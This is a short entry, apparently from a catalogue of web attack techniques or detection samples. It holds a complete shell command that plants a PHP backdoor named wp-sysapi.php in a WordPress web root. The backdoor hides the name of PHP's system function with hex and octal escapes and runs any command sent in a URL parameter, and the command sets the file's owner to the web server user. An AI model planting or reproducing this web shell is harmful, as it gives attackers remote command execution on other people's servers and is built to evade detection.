# category: web
# title: Backdoor in the web root with its function name split and escaped
# indicator: wp-sysapi.php
cat >/var/www/wp/wp-sysapi.php <<'PHP'
<?php
$f = "\x73y" . 'st' . "\145m";
if (isset($_GET["c"])) { $f($_GET["c"]); }
PHP
chown www-data:www-data /var/www/wp/wp-sysapi.php
